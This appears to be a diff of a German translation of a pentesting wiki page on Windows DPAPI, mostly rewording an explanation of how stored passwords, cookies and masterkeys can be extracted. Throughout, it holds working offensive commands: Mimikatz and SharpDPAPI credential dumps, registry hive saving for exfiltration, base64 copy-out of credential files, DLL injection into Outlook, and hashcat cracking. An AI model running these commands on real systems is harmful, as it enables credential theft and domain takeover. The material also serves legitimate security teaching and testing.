@@ -1,4 +1,4 @@
-# DPAPI - Passwörter extrahieren
+# DPAPI - Extracting Passwords
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -6,26 +6,26 @@
 
 ## Was ist DPAPI
 
-Die Data Protection API (DPAPI) wird hauptsächlich innerhalb des Windows-Betriebssystems für die **symmetrische Verschlüsselung asymmetrischer privater Schlüssel** verwendet, wobei Benutzer- oder Systemgeheimnisse als wichtige Entropiequelle genutzt werden. Dieser Ansatz vereinfacht die Verschlüsselung für Entwickler, da sie Daten mit einem aus den Anmeldeinformationen des Benutzers abgeleiteten Schlüssel verschlüsseln können oder bei der Systemverschlüsselung mit den Domänenauthentifizierungsgeheimnissen des Systems, sodass Entwickler den Schutz des Verschlüsselungsschlüssels nicht selbst verwalten müssen.
+Die Data Protection API (DPAPI) wird hauptsächlich innerhalb des Windows-Betriebssystems für die **symmetrische Verschlüsselung asymmetrischer privater Schlüssel** verwendet, wobei Benutzer- oder Systemgeheimnisse als wichtige Entropiequelle genutzt werden. Dieser Ansatz vereinfacht die Verschlüsselung für Entwickler, da sie Daten mit einem Schlüssel verschlüsseln können, der aus den Anmeldeinformationen des Benutzers oder bei der Systemverschlüsselung aus den Domänen-Authentifizierungsgeheimnissen des Systems abgeleitet wird. Dadurch müssen Entwickler den Schutz des Verschlüsselungsschlüssels nicht selbst verwalten.
 
-Die häufigste Möglichkeit zur Verwendung von DPAPI besteht über die Funktionen **`CryptProtectData` und `CryptUnprotectData`**, mit denen Anwendungen Daten sicher innerhalb der Sitzung des aktuell angemeldeten Prozesses verschlüsseln und entschlüsseln können. Das bedeutet, dass die verschlüsselten Daten nur von demselben Benutzer oder System entschlüsselt werden können, das sie verschlüsselt hat.
+Die häufigste Verwendung von DPAPI erfolgt über die Funktionen **`CryptProtectData` und `CryptUnprotectData`**, mit denen Anwendungen Daten sicher innerhalb der Session des aktuell angemeldeten Prozesses verschlüsseln und entschlüsseln können. Das bedeutet, dass die verschlüsselten Daten nur von demselben Benutzer oder System entschlüsselt werden können, das sie verschlüsselt hat.
 
-Darüber hinaus akzeptieren diese Funktionen auch einen **`entropy`-Parameter**, der ebenfalls während der Verschlüsselung und Entschlüsselung verwendet wird. Um etwas zu entschlüsseln, das mit diesem Parameter verschlüsselt wurde, muss daher derselbe Entropiewert angegeben werden, der während der Verschlüsselung verwendet wurde.
+Darüber hinaus akzeptieren diese Funktionen auch einen **`entropy`-Parameter**, der ebenfalls während der Verschlüsselung und Entschlüsselung verwendet wird. Um etwas zu entschlüsseln, das unter Verwendung dieses Parameters verschlüsselt wurde, muss daher derselbe Entropiewert angegeben werden, der bei der Verschlüsselung verwendet wurde.
 
 ### Generierung von Benutzerschlüsseln
 
-DPAPI generiert für jeden Benutzer basierend auf dessen Anmeldeinformationen einen eindeutigen Schlüssel (genannt **`pre-key`**). Dieser Schlüssel wird aus dem Passwort des Benutzers und weiteren Faktoren abgeleitet. Der Algorithmus hängt vom Benutzertyp ab, endet jedoch mit einem SHA1. Bei Domänenbenutzern hängt er beispielsweise **vom NTLM-Hash des Benutzers ab**.
+DPAPI generiert für jeden Benutzer basierend auf dessen Anmeldedaten einen eindeutigen Schlüssel (genannt **`pre-key`**). Dieser Schlüssel wird aus dem Passwort des Benutzers und weiteren Faktoren abgeleitet. Der Algorithmus hängt vom Benutzertyp ab, endet aber mit einem SHA1. Bei Domänenbenutzern hängt er beispielsweise **vom NTLM-Hash des Benutzers** ab.
 
-Dies ist besonders interessant, da ein Angreifer, der den Passwort-Hash des Benutzers erlangen kann, Folgendes tun kann:
+Dies ist besonders interessant, weil ein Angreifer, der den Passwort-Hash des Benutzers erlangen kann, Folgendes tun kann:
 
-- **Alle mit DPAPI verschlüsselten Daten entschlüsseln**, die mit dem Schlüssel dieses Benutzers verschlüsselt wurden, ohne eine API kontaktieren zu müssen
-- Versuchen, das **Passwort offline zu knacken**, indem versucht wird, den gültigen DPAPI-Schlüssel zu generieren
+- **Beliebige Daten entschlüsseln, die mit DPAPI** unter Verwendung des Schlüssels dieses Benutzers verschlüsselt wurden, ohne eine API kontaktieren zu müssen
+- Versuchen, das **Passwort** offline zu **cracken**, indem versucht wird, den gültigen DPAPI-Schlüssel zu generieren
 
 Außerdem wird jedes Mal, wenn ein Benutzer Daten mit DPAPI verschlüsselt, ein neuer **master key** generiert. Dieser master key wird tatsächlich zur Verschlüsselung der Daten verwendet. Jeder master key erhält eine **GUID** (Globally Unique Identifier), die ihn identifiziert.
 
-Die master keys werden im Verzeichnis **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** gespeichert, wobei `{SID}` der Security Identifier dieses Benutzers ist. Der master key wird mit dem **`pre-key`** des Benutzers und außerdem mit einem **domain backup key** zur Wiederherstellung verschlüsselt (der gleiche Schlüssel wird also zweimal mit zwei verschiedenen Passwörtern verschlüsselt).
+Die master keys werden im Verzeichnis **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** gespeichert, wobei `{SID}` der Security Identifier dieses Benutzers ist. Der master key wird mit dem **`pre-key`** des Benutzers und zusätzlich mit einem **domain backup key** zur Wiederherstellung verschlüsselt (der gleiche Schlüssel wird also zweimal mit zwei verschiedenen Passwörtern verschlüsselt).
 
-Beachte, dass sich der **domain key zur Verschlüsselung des master key auf den Domain Controllern befindet und sich niemals ändert**. Wenn ein Angreifer Zugriff auf den Domain Controller hat, kann er daher den domain backup key abrufen und die master keys aller Benutzer in der Domäne entschlüsseln.<sup>[[2]](#references)</sup>
+Beachte, dass sich der **domain key, der zur Verschlüsselung des master key verwendet wird, auf den Domain Controllern befindet und sich niemals ändert**. Wenn ein Angreifer Zugriff auf den Domain Controller hat, kann er daher den domain backup key abrufen und die master keys aller Benutzer in der Domäne entschlüsseln.<sup>[[2]](#references)</sup>
 
 Die verschlüsselten Blobs enthalten in ihren Headern die **GUID des master key**, der zur Verschlüsselung der darin enthaltenen Daten verwendet wurde.
 
@@ -41,24 +41,24 @@ Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
 Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
 Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
 ```
-Dies ist das Aussehen einer Sammlung von Master Keys eines Benutzers:
+So sehen mehrere Master Keys eines Benutzers aus:
 
-![Was ist DPAPI – Generierung der User Keys: Dies ist das Aussehen einer Sammlung von Master Keys eines Benutzers](<../../images/image (1121).png>)
+![Was ist DPAPI – Generierung der Benutzer-Keys: So sehen mehrere Master Keys eines Benutzers aus](<../../images/image (1121).png>)
 
-### Generierung von Machine/System Keys
+### Generierung von Machine/System-Keys
 
-Dieser Key wird von der Machine zur Verschlüsselung von Daten verwendet. Er basiert auf dem **DPAPI_SYSTEM LSA secret**, einem speziellen Key, auf den nur der SYSTEM-Benutzer zugreifen kann. Dieser Key wird verwendet, um Daten zu verschlüsseln, die für das System selbst zugänglich sein müssen, etwa Credentials auf Machine-Ebene oder systemweite Secrets.<sup>[[2]](#references)</sup>
+Dieser Key wird von der Machine zur Verschlüsselung von Daten verwendet. Er basiert auf dem **DPAPI_SYSTEM LSA secret**, einem speziellen Key, auf den nur der SYSTEM-Benutzer zugreifen kann. Dieser Key wird zur Verschlüsselung von Daten verwendet, die für das System selbst zugänglich sein müssen, etwa Machine-level credentials oder systemweite Secrets.<sup>[[2]](#references)</sup>
 
-Beachte, dass diese Keys **kein domain backup haben** und daher nur lokal zugänglich sind:
+Beachte, dass diese Keys **kein Domain-Backup haben** und daher nur lokal zugänglich sind:
 
-- **Mimikatz** kann darauf zugreifen, indem LSA secrets mit folgendem Befehl gedumpt werden: `mimikatz lsadump::secrets`
-- Das Secret wird in der Registry gespeichert, sodass ein Administrator **die DACL permissions ändern könnte, um darauf zuzugreifen**. Der Registry-Pfad lautet: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
-- Eine Offline-Extraktion aus Registry hives ist ebenfalls möglich. Speichere beispielsweise als Administrator auf dem Target die hives und exfiltriere sie:
+- **Mimikatz** kann darauf zugreifen, indem es LSA secrets mit folgendem Befehl dumpt: `mimikatz lsadump::secrets`
+- Das Secret wird in der Registry gespeichert, sodass ein Administrator **die DACL-Berechtigungen ändern könnte, um darauf zuzugreifen**. Der Registry-Pfad lautet: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
+- Eine Offline-Extraktion aus Registry-Hives ist ebenfalls möglich. Speichere beispielsweise als Administrator auf dem Target die Hives und exfiltriere sie:
 ```cmd
 reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
 reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
 ```
-Anschließend stellst du auf deiner Analyse-Box das DPAPI_SYSTEM-LSA-Secret aus den Hives wieder her und verwendest es, um Blobs im Computerbereich zu entschlüsseln (Passwörter geplanter Tasks, Service-Credentials, Wi-Fi-Profile usw.):
+Führe dann auf deiner Analyse-Box das DPAPI_SYSTEM-LSA-Secret aus den Hives wieder zusammen und verwende es, um Blobs im Machine-Scope zu entschlüsseln (Passwörter geplanter Tasks, Service-Credentials, WLAN-Profile usw.):
 ```text
 mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
 # Look for the DPAPI_SYSTEM secret in the output
@@ -67,23 +67,23 @@ mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.
 
 Zu den durch DPAPI geschützten persönlichen Daten gehören:
 
-- Windows-Credentials
+- Windows-Anmeldedaten
 - Passwörter und Auto-Vervollständigungsdaten von Internet Explorer und Google Chrome
-- E-Mail- und interne FTP-Account-Passwörter für Anwendungen wie Outlook und Windows Mail
+- E-Mail- und interne FTP-Kontopasswörter für Anwendungen wie Outlook und Windows Mail
 - Passwörter für freigegebene Ordner, Ressourcen, drahtlose Netzwerke und Windows Vault, einschließlich Verschlüsselungsschlüsseln
-- Passwörter für Remote-Desktop-Verbindungen, .NET Passport sowie private Schlüssel für verschiedene Verschlüsselungs- und Authentifizierungszwecke
-- Netzwerkpasswörter, die vom Credential Manager verwaltet werden, sowie persönliche Daten in Anwendungen, die CryptProtectData verwenden, beispielsweise Skype, MSN Messenger und weitere
+- Passwörter für Remotedesktopverbindungen, .NET Passport sowie private Schlüssel für verschiedene Verschlüsselungs- und Authentifizierungszwecke
+- Netzwerkpasswörter, die vom Credential Manager verwaltet werden, sowie persönliche Daten in Anwendungen, die CryptProtectData verwenden, wie Skype, MSN Messenger und andere
 - Verschlüsselte Blobs innerhalb der Registry
 - ...
 
 Zu den vom System geschützten Daten gehören:
 - Wi-Fi-Passwörter
-- Passwörter für geplante Tasks
+- Passwörter geplanter Aufgaben
 - ...
 
-### Optionen zur Extraktion von Master Keys
+### Optionen zum Extrahieren von Master Keys
 
-- Wenn der Benutzer über Domain-Admin-Rechte verfügt, kann er auf den **Domain-Backup-Key** zugreifen, um alle Master Keys der Benutzer in der Domain zu entschlüsseln:
+- Wenn der Benutzer über Domain-Admin-Rechte verfügt, kann er auf den **domain backup key** zugreifen, um alle Master Keys der Benutzer in der Domain zu entschlüsseln:
 ```bash
 # Mimikatz
 lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export
@@ -91,17 +91,17 @@ lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export
 # SharpDPAPI
 SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
 ```
-- Mit lokalen Administratorrechten ist es möglich, auf den **LSASS-Speicher** zuzugreifen, um die DPAPI-Master-Keys aller verbundenen Benutzer sowie den SYSTEM-Key zu extrahieren.
+- Mit lokalen Administratorrechten ist es möglich, auf den **LSASS-Speicher** zuzugreifen, um die DPAPI-Masterschlüssel aller verbundenen Benutzer und den SYSTEM-Schlüssel zu extrahieren.
 ```bash
 # Mimikatz
 mimikatz sekurlsa::dpapi
 ```
-- Wenn der Benutzer über lokale Administratorrechte verfügt, kann er auf das **DPAPI_SYSTEM LSA secret** zugreifen, um die Masterschlüssel des Computers zu entschlüsseln:
+- Wenn der Benutzer über lokale Administratorrechte verfügt, kann er auf das **DPAPI_SYSTEM LSA secret** zugreifen, um die Master Keys des Computers zu entschlüsseln:
 ```bash
 # Mimikatz
 lsadump::secrets /system:DPAPI_SYSTEM /export
 ```
-- Wenn das Passwort oder der NTLM-Hash des Benutzers bekannt ist, können Sie die **Master Keys des Benutzers direkt entschlüsseln**:
+- Wenn das Passwort oder der NTLM-Hash des Benutzers bekannt ist, kannst du die **Master Keys des Benutzers direkt entschlüsseln**:
 ```bash
 # Mimikatz
 dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected
@@ -109,7 +109,7 @@ dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /password:PASSWORD
 ```
-- Wenn du dich innerhalb einer Session als der Benutzer befindest, ist es möglich, den **Backup Key zum Entschlüsseln der Master Keys über RPC** beim **DC** anzufordern. Wenn du lokaler Administrator bist und der Benutzer angemeldet ist, könntest du dafür **sein Session-Token stehlen**:
+- Wenn du dich innerhalb einer Session als der Benutzer befindest, ist es möglich, den DC nach dem **backup key zum Entschlüsseln der master keys mithilfe von RPC** zu fragen. Wenn du lokaler Administrator bist und der Benutzer angemeldet ist, könntest du dafür **sein session token stehlen**:
 ```bash
 # Mimikatz
 dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc
@@ -129,12 +129,12 @@ mimikatz vault::list
 
 ### DPAPI-verschlüsselte Daten finden
 
-Häufig geschützte Dateien von Benutzern befinden sich in:
+Häufig geschützte Dateien von Benutzern befinden sich unter:
 
 - `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
 - `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
 - `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
-- Prüfe auch, ob du in den oben genannten Pfaden `\Roaming\` durch `\Local\` ersetzt.
+- Prüfe auch, ob `\Roaming\` in den oben genannten Pfaden durch `\Local\` ersetzt wird.
 
 Beispiele für die Enumeration:
 ```bash
@@ -143,7 +143,7 @@ dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 ```
-[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) kann DPAPI-verschlüsselte Blobs im Dateisystem, in der Registry und in B64-Blobs finden:
+[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) kann DPAPI-verschlüsselte Blobs im Dateisystem, in der Registry und in B64-Blobs finden:<sup>[[12]](#references)</sup>
 ```bash
 # Search blobs in the registry
 search /type:registry [/path:HKLM] # Search complete registry by default
@@ -158,39 +158,39 @@ search /type:file /path:C:\path\to\file
 # Search a blob inside B64 encoded data
 search /type:base64 [/base:<base64 string>]
 ```
-Beachte, dass [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (aus demselben Repo) verwendet werden kann, um sensible Daten wie Cookies mithilfe von DPAPI zu entschlüsseln.
+Beachte, dass [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (aus demselben Repo) verwendet werden kann, um sensible Daten wie Cookies mit DPAPI zu entschlüsseln.<sup>[[12]](#references)</sup>
 
-#### Schnelle Rezepte für Chromium/Edge/Electron (SharpChrome)
+#### Chromium/Edge/Electron-Kurzanleitungen (SharpChrome)
 
-- Aktueller Benutzer, interaktive Entschlüsselung gespeicherter Logins/Cookies (funktioniert auch mit an die Anwendung gebundenen Cookies in Chrome 127+, da der zusätzliche Schlüssel aus dem Credential Manager des Benutzers aufgelöst wird, wenn der Vorgang im Benutzerkontext ausgeführt wird):
+- Aktueller Benutzer, interaktive Entschlüsselung gespeicherter Logins/Cookies (funktioniert auch mit an die Anwendung gebundenen Cookies ab Chrome 127+, da der zusätzliche Schlüssel aus dem Credential Manager des Benutzers aufgelöst wird, wenn der Vorgang im Benutzerkontext ausgeführt wird):
 ```cmd
 SharpChrome logins  /browser:edge  /unprotect
 SharpChrome cookies /browser:chrome /format:csv /unprotect
 ```
-- Offline-Analyse, wenn Sie nur Dateien haben. Extrahieren Sie zunächst den AES-State-Key aus dem „Local State“ des Profils und verwenden Sie ihn anschließend, um die Cookie-Datenbank zu entschlüsseln:
+- Offline-Analyse, wenn Sie nur Dateien haben. Extrahieren Sie zuerst den AES-State-Key aus dem „Local State“ des Profils und verwenden Sie ihn anschließend, um die Cookie-Datenbank zu entschlüsseln:
 ```cmd
 # Dump the AES state key from Local State (DPAPI will be used if running as the user)
 SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
 # Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
 SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
 ```
-- Domain-weite/Remote-Triage, wenn Sie den DPAPI-Domain-Backup-Key (PVK) und Admin-Rechte auf dem Zielhost haben:
+- Domain-weite/Remote-Triage, wenn du über den DPAPI domain backup key (PVK) und Admin-Rechte auf dem Zielhost verfügst:
 ```cmd
 SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
 SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
 ```
-- Wenn du den DPAPI prekey/credkey eines Benutzers (aus LSASS) besitzt, kannst du das Password Cracking überspringen und Profildaten direkt entschlüsseln:
+- Wenn du über den DPAPI prekey/credkey eines Benutzers (aus LSASS) verfügst, kannst du das password cracking überspringen und Profildaten direkt entschlüsseln:
 ```cmd
 # For SharpChrome use /prekey; for SharpDPAPI use /credkey
 SharpChrome cookies /browser:edge /prekey:SHA1_HEX
 SharpDPAPI.exe credentials /credkey:SHA1_HEX
 ```
-Hinweise
-- Neuere Chrome/Edge-Builds speichern bestimmte Cookies möglicherweise mit „App-Bound“-Verschlüsselung. Die Offline-Entschlüsselung dieser spezifischen Cookies ist ohne den zusätzlichen appgebundenen Schlüssel nicht möglich. Führe SharpChrome im Kontext des Zielbenutzers aus, um ihn automatisch abzurufen. Siehe den unten referenzierten Chrome-Security-Blogbeitrag.<sup>[[5]](#references)</sup>
+Notizen
+- Neuere Chrome/Edge-Builds können bestimmte Cookies mit "App-Bound"-Verschlüsselung speichern. Die Offline-Entschlüsselung dieser spezifischen Cookies ist ohne den zusätzlichen appgebundenen Schlüssel nicht möglich. Führe SharpChrome im Kontext des Zielbenutzers aus, um ihn automatisch abzurufen. Siehe den unten referenzierten Chrome security blog post.<sup>[[5]](#references)</sup>
 
 ### Zugriffsschlüssel und Daten
 
-- **Verwende SharpDPAPI**, um Zugangsdaten aus DPAPI-verschlüsselten Dateien der aktuellen Sitzung abzurufen:
+- **Verwende SharpDPAPI**, um Anmeldedaten aus DPAPI-verschlüsselten Dateien der aktuellen Sitzung abzurufen:
 ```bash
 # Decrypt user data
 ## Note that 'triage' is like running credentials, vaults, rdg and certificates
@@ -199,7 +199,7 @@ SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect
 # Decrypt machine data
 SharpDPAPI.exe machinetriage
 ```
-- **Informationen zu Zugangsdaten abrufen** wie die verschlüsselten Daten und den guidMasterKey.<sup>[[3]](#references)</sup>
+- **Credentials-Informationen abrufen** wie die verschlüsselten Daten und den guidMasterKey.<sup>[[3]](#references)</sup>
 ```bash
 mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7
 
@@ -211,7 +211,7 @@ pbData             : b8f619[...snip...]b493fe
 ```
 - **Auf Masterkeys zugreifen**:
 
-Einen Masterkey eines Users entschlüsseln, der den **domain backup key** über RPC anfordert:
+Entschlüsseln Sie einen Masterkey eines Benutzers, der den **domain backup key** über RPC anfordert:
 ```bash
 # Mimikatz
 dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc
@@ -219,7 +219,7 @@ dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" 
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /rpc
 ```
-Das **SharpDPAPI**-Tool unterstützt außerdem die folgenden Argumente zur Entschlüsselung von Masterkeys (beachte, dass `/rpc` verwendet werden kann, um den Backup-Key der Domäne abzurufen, `/password`, um ein Klartextpasswort zu verwenden, oder `/pvk`, um eine private DPAPI-Domänenschlüsseldatei anzugeben...):<sup>[[12]](#references)</sup>
+Das **SharpDPAPI**-Tool unterstützt außerdem diese Argumente für die Masterkey-Entschlüsselung (beachte, dass `/rpc` verwendet werden kann, um den Backup-Key der Domäne abzurufen, `/password`, um ein Klartextpasswort zu verwenden, oder `/pvk`, um eine private DPAPI-Domänenschlüsseldatei anzugeben ...):<sup>[[12]](#references)</sup>
 ```
 /target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
 /pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
@@ -239,7 +239,7 @@ dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
 # SharpDPAPI
 SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
 ```
-Das **SharpDPAPI**-Tool unterstützt außerdem diese Argumente zur Entschlüsselung von `credentials|vaults|rdg|keepass|triage|blob|ps` (beachte, dass `/rpc` verwendet werden kann, um den Backup-Schlüssel der Domäne abzurufen, `/password` für die Verwendung eines Klartextpassworts, `/pvk` zur Angabe einer DPAPI-Domänen-Private-Key-Datei und `/unprotect` zur Verwendung der Sitzung des aktuellen Benutzers ...):<sup>[[12]](#references)</sup>
+Das **SharpDPAPI**-Tool unterstützt außerdem diese Argumente für die Entschlüsselung von `credentials|vaults|rdg|keepass|triage|blob|ps` (beachte, dass `/rpc` verwendet werden kann, um den Domänen-Backup-Schlüssel abzurufen, `/password`, um ein Klartextpasswort zu verwenden, `/pvk`, um eine Datei mit dem privaten DPAPI-Domänenschlüssel anzugeben, und `/unprotect`, um die Sitzung des aktuellen Benutzers zu verwenden...):<sup>[[12]](#references)</sup>
 ```
 Decryption:
 /unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
@@ -258,9 +258,9 @@ Targeting:
 Note: must use with /pvk:KEY or /password:X
 Note: not applicable to 'blob' or 'ps' commands
 ```
-- Eine DPAPI prekey/credkey direkt verwenden (kein Passwort erforderlich)
+- DPAPI prekey/credkey direkt verwenden (kein Passwort erforderlich)
 
-Wenn du LSASS dumpen kannst, gibt Mimikatz häufig einen logon-spezifischen DPAPI-Schlüssel aus, mit dem sich die Masterkeys des Benutzers entschlüsseln lassen, ohne das Klartextpasswort zu kennen. Übergib diesen Wert direkt an das Tool:
+Wenn Sie LSASS dumpen können, legt Mimikatz häufig einen DPAPI-Schlüssel pro Anmeldung offen, mit dem die Masterkeys des Benutzers entschlüsselt werden können, ohne das Klartextpasswort zu kennen. Übergeben Sie diesen Wert direkt an das Tooling:
 ```cmd
 # SharpDPAPI accepts the "credkey" (domain or local SHA1)
 SharpDPAPI.exe triage /credkey:SHA1_HEX
@@ -268,7 +268,7 @@ SharpDPAPI.exe triage /credkey:SHA1_HEX
 # SharpChrome accepts the same value as a "prekey"
 SharpChrome logins /browser:edge /prekey:SHA1_HEX
 ```
-- Einige Daten mithilfe der **Sitzung des aktuellen Benutzers** entschlüsseln:
+- Einige Daten mit der **aktuellen Benutzersitzung** entschlüsseln:
 ```bash
 # Mimikatz
 dpapi::blob /in:C:\path\to\encrypted\file /unprotect
@@ -278,21 +278,21 @@ SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
 ```
 ---
 
-### Offline-Entschlüsselung mit Impacket dpapi.py
+### Offline decryption mit Impacket dpapi.py
 
-Wenn du die SID und das Passwort des Opferbenutzers (oder den NT hash) hast, kannst du DPAPI masterkeys und Credential Manager blobs vollständig offline mit Impackets dpapi.py entschlüsseln.<sup>[[10]](#references)[[11]](#references)</sup>
+Wenn du die SID und das Passwort des Opferbenutzers (oder den NT-Hash) hast, kannst du DPAPI-Masterkeys und Credential Manager blobs mit Impackets dpapi.py vollständig offline entschlüsseln.<sup>[[10]](#references)[[11]](#references)</sup>
 
-- Artefakte auf dem Datenträger identifizieren:
+- Artefakte auf der Festplatte identifizieren:
 - Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
-- Passender masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}
+- Zugehöriger Masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}
 
-- Wenn das File-Transfer-Tool unzuverlässig ist, base64-enkodiere die Dateien auf dem Host und kopiere die Ausgabe:
+- Wenn Dateiübertragungs-Tools unzuverlässig sind, base64-kodiere die Dateien auf dem Host und kopiere die Ausgabe:
 ```powershell
 # Base64-encode files for copy/paste exfil
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
 ```
-- Entschlüssle den masterkey mit der SID und dem Passwort/Hash des Benutzers:
+- Entschlüsseln Sie den Masterkey mit der SID und dem Passwort/Hash des Benutzers:
 ```bash
 # Plaintext password
 python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
@@ -308,15 +308,15 @@ python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTE
 # Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
 # Username=<user> ; Password=<cleartext>
 ```
-Dieser Ablauf stellt häufig Domain-Credentials wieder her, die von Apps mit dem Windows Credential Manager gespeichert wurden, einschließlich administrativer Konten (z. B. `*_adm`).
+Dieser Ablauf stellt häufig Domänenanmeldedaten wieder her, die von Apps mithilfe des Windows Credential Manager gespeichert wurden, einschließlich administrativer Konten (z. B. `*_adm`).
 
 ---
 
 ### Umgang mit optionaler Entropy („Third-party entropy“)
 
-Einige Anwendungen übergeben einen zusätzlichen **Entropy**-Wert an `CryptProtectData`. Ohne diesen Wert kann der Blob nicht entschlüsselt werden, selbst wenn der korrekte Masterkey bekannt ist. Das Beschaffen der Entropy ist daher beim Zugriff auf auf diese Weise geschützte Credentials unerlässlich (z. B. bei Microsoft Outlook und einigen VPN-Clients).
+Einige Anwendungen übergeben einen zusätzlichen **Entropy**-Wert an `CryptProtectData`. Ohne diesen Wert kann der Blob nicht entschlüsselt werden, selbst wenn der korrekte Masterkey bekannt ist. Das Abrufen der Entropy ist daher beim Angreifen von auf diese Weise geschützten Anmeldedaten unerlässlich (z. B. bei Microsoft Outlook und einigen VPN-Clients).
 
-[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) ist eine User-Mode-DLL, die die DPAPI-Funktionen innerhalb des Zielprozesses hookt und jede übergebene optionale Entropy transparent aufzeichnet. Wird EntropyCapture im **DLL-injection**-Modus gegen Prozesse wie `outlook.exe` oder `vpnclient.exe` ausgeführt, wird eine Datei ausgegeben, die jeden Entropy-Buffer dem aufrufenden Prozess und Blob zuordnet. Die erfasste Entropy kann später an **SharpDPAPI** (`/entropy:`) oder **Mimikatz** (`/entropy:<file>`) übergeben werden, um die Daten zu entschlüsseln.<sup>[[6]](#references)</sup>
+[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) ist eine User-Mode-DLL, die die DPAPI-Funktionen innerhalb des Zielprozesses hookt und jede bereitgestellte optionale Entropy transparent aufzeichnet. Wird EntropyCapture im **DLL-injection**-Modus gegen Prozesse wie `outlook.exe` oder `vpnclient.exe` ausgeführt, wird eine Datei ausgegeben, die jeden Entropy-Puffer dem aufrufenden Prozess und Blob zuordnet. Die aufgezeichnete Entropy kann später an **SharpDPAPI** (`/entropy:`) oder **Mimikatz** (`/entropy:<file>`) übergeben werden, um die Daten zu entschlüsseln.<sup>[[6]](#references)</sup>
 ```powershell
 # Inject EntropyCapture into the current user's Outlook
 InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll
@@ -324,9 +324,9 @@ InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll
 # Later decrypt a credential blob that required entropy
 SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
 ```
-### Masterkeys offline cracken (Hashcat & DPAPISnoop)
+### Offline-Cracking von masterkeys (Hashcat & DPAPISnoop)
 
-Microsoft führte ab Windows 10 v1607 (2016) ein **context 3**-Masterkey-Format ein. `hashcat` v6.2.6 (Dezember 2023) fügte die Hash-Modi **22100** (DPAPI masterkey v1 context ), **22101** (context 1) und **22102** (context 3) hinzu, die GPU-beschleunigtes Cracking von Benutzerpasswörtern direkt aus der Masterkey-Datei ermöglichen. Angreifer können daher Wordlist- oder Brute-Force-Angriffe durchführen, ohne mit dem Zielsystem zu interagieren.<sup>[[7]](#references)</sup>
+Microsoft führte mit Windows 10 v1607 (2016) ein **context 3**-masterkey-Format ein. `hashcat` v6.2.6 (Dezember 2023) fügte die Hash-Modi **22100** (DPAPI masterkey v1 context ), **22101** (context 1) und **22102** (context 3) hinzu, die GPU-beschleunigtes Cracking von Benutzerpasswörtern direkt aus der masterkey-Datei ermöglichen. Angreifer können daher word-list- oder brute-force-Angriffe durchführen, ohne mit dem Zielsystem zu interagieren.<sup>[[7]](#references)</sup>
 
